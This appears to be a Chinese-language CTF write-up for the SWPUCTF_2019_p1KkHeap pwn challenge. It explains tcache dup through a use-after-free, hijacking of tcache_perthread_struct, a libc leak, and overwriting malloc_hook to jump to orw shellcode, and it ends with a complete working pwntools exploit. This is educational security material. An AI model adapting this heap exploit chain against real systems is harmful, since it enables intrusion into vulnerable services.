[toc]

## SWPUCTF_2019_p1KkHeap

### 总结

根据本题，学习与收获有：

- `tcache attack`时 如果可以利用`tcache_perthread_struct`，优先考虑利用这个结构体，可以省去很多麻烦。控制了这个结构体，相当于就控制了`malloc`的分配，可以控制`tcache bins`中`chunk`的数量和分配地址。
- `tcache_perthread_struct`结构体在堆上，大小一般为`0x250`。它的前64个字节，分别代表`0x20~0x410`大小的`chunk(包括chunk头)`的数量。当超过`7`的时候，再次释放的`chunk`会被放入到`fastbin`或者`unsorted bin`。后面的内存，则分别表示`0x20~0x410`大小`tcache bins`的首地址。

如图所示：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210314224314.png)

然后看一下内部细节：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210314224902.png)

首地址如果是一个有效的地址，下一次分配对应大小的`chunk`会直接从该地址处分配，没有`chunk size`的检查。

- `tcache attack`可以重复释放，可以直接修改`tcache entry`的值，没有`chunk size`的检查。

### 题目分析

#### checksec

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210314225216.png)

保护全开！

#### 函数分析

很明显，又是一个菜单题。首先来看`main`函数。

##### main

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210314232327.png)

这些函数的名字我都修改过。然后看一下这个`set_prctl`到底干了啥：

##### set_prctl

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210314232502.png)

同时，结合`seccomp-tools`查看一下禁用了哪些系统调用：

![image-20210314232629126](C:\Users\CHuan\AppData\Roaming\Typora\typora-user-images\image-20210314232629126.png)

不能执行`execve`系统调用。那么结合前面的`mmap`，猜测可以控制程序执行流到`0x66660000`处，提前在这里写好`shellcode`，通过`orw`的方式读取`flag`。

继续往下分析函数。

##### menu

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210314232906.png)

##### add_note

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210314233450.png)

`size`的大小只能控制在`0x100`以内，最多执行该函数`7`次。

##### show_note

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210314233559.png)



##### edit_note

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210314233649.png)



##### del_note

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210314233739.png)

可以看到，只能`free`三次，且存储内存指针的数组没有置为空。

#### 漏洞点

- 程序的运行环境为`ubuntu 18.04`，`libc`的版本为`2.27`，有`tcache bin`机制。可以很明显的看到，在`del_note`函数中有一个`UAF`的漏洞。但是，最多只能`free`3次。结合`tcache dup`的利用手段，`tcache bin`连续两次释放，并不会`crash`，而会造成这个链表自己指向自己。这样，连续分配三次后，可以在任意地址分配`chunk`。
- `mmap`分配的内存具有可读可写可执行的权限，所以可以往这上面写shellcode，然后劫持`malloc_hook`到地址`0x66660000`，跳转执行shellcode。注意，不能包含`execve`的系统调用，所以只能写`orw`的shellcode。

### 利用思路

#### 知识点

- 如上面所说，每一个线程都会维护一个结构体，名为`tcache_perthread_struct`，这个结构体负责`tcache in chunk`的分配。所以，只要控制住这个结构体，就能实现控制任意大小的`tcache bin chunk`的任意地址的分配。
- 当`tcache bins`放满7个后，剩余`free`掉的`chunk`会被放到`fastbin`或者`unsorted bin`。这里判断对应带大小的`tcache bins`的方法，就是检查`tcache_perthread_struct`中的字段的大小是不是大于6。
- `calloc`不会从`tcache bin`中取`chunk`，但是如果对应大小的`tcache bin`未满7个的话，会把对应大小的`fastbin`或者`small bin`以头插法的形式，插入到`tcache bin`中。也就是说，如果修改了`fd/bk`指针，可以往任意一个地方写一个`libc`地址。（这个知识点可能用不到，不过可以先总结一下。）

#### 利用过程

这里采取劫持`tcache_perthread_struct`，然后通过控制对应大小的`tcache bin`的数量，使得下一次释放的`chunk`被放置在`unsorted bin`中。，从而泄露出`libc`的地址，根据偏移计算出`malloc_hook`的地址。

步骤：

- 连续申请两块大小为`0x100`大小的`chunk 0`和`chunk 1`
- 连续释放两次`chunk 1`
- 通过`show`功能打印出堆地址，进而泄露出`tcache_perthread_struct`的地址，并分配到这里
- 修改`0x100`大小的`tcache bin`的首地址为`0x66660000`和个数为`0`
- 分配到`0x66660000`处，写入`shellcode`
- 释放`chunk 0`，此时`chunk 0`会进入到`unsorted bin`，利用`show`功能打印出`libc`地址
- 再次控制`tcache_perthread_struct`，分配到`malloc_hook`处，写入`0x66660000`
- 任意执行一次`add_note`即可打印出`flag`

### EXP

#### 调试过程

我们就按照上面所说的这个利用思路来进行调试。

定义好相关的函数：

```python
def add_note(size:int):
    global io
    io.sendlineafter("Your Choice: ", '1')
    io.sendlineafter("size: ", str(size))
    io.recvuntil("Done!\n")

def show_note(idx:int):
    global io
    io.sendlineafter("Your Choice: ", '2')
    io.sendlineafter("id: ", str(idx))
    msg = io.recvline()
    leak_addr = msg[9:15]
    leak_addr = u64(leak_addr.ljust(8, b'\x00'))
    LOG_ADDR('leak_addr', leak_addr)
    io.recvuntil("Done!\n")
    return leak_addr

def edit_note(idx:int, content:bytes=b'a'):
    global io
    io.sendlineafter("Your Choice: ", '3')
    io.sendlineafter("id: ", str(idx))
    io.sendafter("content: ", content)
    io.recvuntil("Done!\n")

def del_note(idx:int):
    global io
    io.sendlineafter("Your Choice: ", '4')
    io.sendlineafter("id: ", str(idx))
    io.recvuntil("Done!\n")
```



首先执行两次`add_note`

```python
add_note(0x100) # 0
add_note(0x100) # 1
```

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210319235345.png)



然后，执行`tcache dup`：

```python
del_note(1)
del_note(1)
```

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210319235505.png)

然后泄露出地址，并分配到`tcache_perthread_struct`

```python
# get heap addr
heap_addr = show_note(1)
tcache_struct = heap_addr - 0x360
add_note(0x100) # 2
edit_note(2, p64(tcache_struct) * 2)

add_note(0x100) # 3
add_note(0x100) # 4 tcache struct 
```

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210319235634.png)

可以看到，`0x100`大小的`chunk`的`count`变成了`-1`

分配到`0x66660000`

```python
edit_note(4, 0xb8 * b'\x00' + p64(0x66660000))
# 0x66660000 chunk
add_note(0x100) # 5
```

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210319235816.png)

写入`shellcode`到`0x66660000`

```python
shellcode = shellcraft.open('flag', 0)
shellcode += shellcraft.read(3, 0x66660300, 0x30)
shellcode += shellcraft.write(1, 0x66660300, 0x30)
edit_note(5, asm(shellcode))
```

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210319235924.png)

泄露`libc`地址，并且计算出`malloc_hook`地址

```python
del_note(0)
main_arena_96 = show_note(0)
malloc_hook = main_arena_96 - 0x70
```

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210320000120.png)

分配到`malloc_hook`，写入`0x66660000`，并执行一次`add_note`

```python
add_note(0x100) # 6
edit_note(6, p64(0x66660000))

io.sendlineafter("Your Choice: ", '1')
io.sendlineafter("size: ", str(100))
```

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210320000232.png)

最后远程打的结果：

![](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/20210320000519.png)



#### 完整exp

```python
from pwn import *
context.update(arch='amd64', os='linux', endian='little')
io = process('./pwn')

def add_note(size:int):
    global io
    io.sendlineafter("Your Choice: ", '1')
    io.sendlineafter("size: ", str(size))
    io.recvuntil("Done!\n")

def show_note(idx:int):
    global io
    io.sendlineafter("Your Choice: ", '2')
    io.sendlineafter("id: ", str(idx))
    msg = io.recvline()
    leak_addr = msg[9:15]
    leak_addr = u64(leak_addr.ljust(8, b'\x00'))
    LOG_ADDR('leak_addr', leak_addr)
    io.recvuntil("Done!\n")
    return leak_addr

def edit_note(idx:int, content:bytes=b'a'):
    global io
    io.sendlineafter("Your Choice: ", '3')
    io.sendlineafter("id: ", str(idx))
    io.sendafter("content: ", content)
    io.recvuntil("Done!\n")

def del_note(idx:int):
    global io
    io.sendlineafter("Your Choice: ", '4')
    io.sendlineafter("id: ", str(idx))
    io.recvuntil("Done!\n")


# tcache bin dup
add_note(0x100) # 0
add_note(0x100) # 1
del_note(1)
del_note(1)

# get heap addr
heap_addr = show_note(1)
tcache_struct = heap_addr - 0x360
add_note(0x100) # 2
edit_note(2, p64(tcache_struct) * 2)

add_note(0x100) # 3
add_note(0x100) # 4 tcache struct 
LOG_ADDR('tcache_struct', tcache_struct)

edit_note(4, 0xb8 * b'\x00' + p64(0x66660000))

# 0x66660000 chunk
add_note(0x100) # 5

shellcode = shellcraft.open('flag', 0)
shellcode += shellcraft.read(3, 0x66660300, 0x30)
shellcode += shellcraft.write(1, 0x66660300, 0x30)
edit_note(5, asm(shellcode))

# leak libc_addr
del_note(0)
main_arena_96 = show_note(0)
malloc_hook = main_arena_96 - 0x70
LOG_ADDR('malloc_hook', malloc_hook)
edit_note(4, 0xb8 * b'\x00' + p64(malloc_hook))

add_note(0x100) # 6
edit_note(6, p64(0x66660000))

io.sendlineafter("Your Choice: ", '1')
io.sendlineafter("size: ", str(100))

io.interactive()
```







